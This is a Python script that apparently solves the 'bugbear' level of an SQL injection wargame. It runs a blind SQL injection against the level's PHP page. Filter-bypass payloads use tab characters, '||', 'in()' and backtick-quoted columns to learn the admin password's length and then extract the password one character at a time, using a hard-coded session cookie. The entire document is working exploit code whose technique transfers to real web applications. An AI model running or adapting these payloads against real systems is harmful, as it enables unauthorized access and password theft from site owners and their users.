import requests
import string

def lenth():
    lenc=0
    for i in range(1,100):
        par = "?pw=a&no=1%09||%09id%09in(\"admin\")%09%26%26%09LENGTH(`pw`)%09in(\"" + str(i) + "\")%23#"
        print("[+]pay : %s " % par)
        new_url = url + par
        r = requests.get(new_url, cookies=cookie)
        if r.text.find("Hello admin") > 0:
            print("[+]pw's length : " + str(i))
            lenc = i
            break
    return lenc

def guess(length):
    global pw
    for i in range(1,length+1):
        for j in string:
            par = "?pw=a&no=1%09||%09id%09in(\"admin\")%09%26%26%09left(`pw`,"+str(i)+")%09in(\""+pw+j+"\")%23#"
            print("[+]pay : %s " % par)
            u = url + par
            t = requests.get(u, cookies=cookie)
            if t.text.find("Hello admin") > 0:
                pw = pw + j
                print("[+] Pw : %s " % pw)
                break

if __name__=='__main__':
    url="http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"
    cookie = dict(PHPSESSID="2jumpdmat5f035imvarpn58ai0")
    string = string.digits + string.ascii_letters
    pw = ''

    lent = lenth()
    guess(lent)
    print("[+]PW : %s" % pw)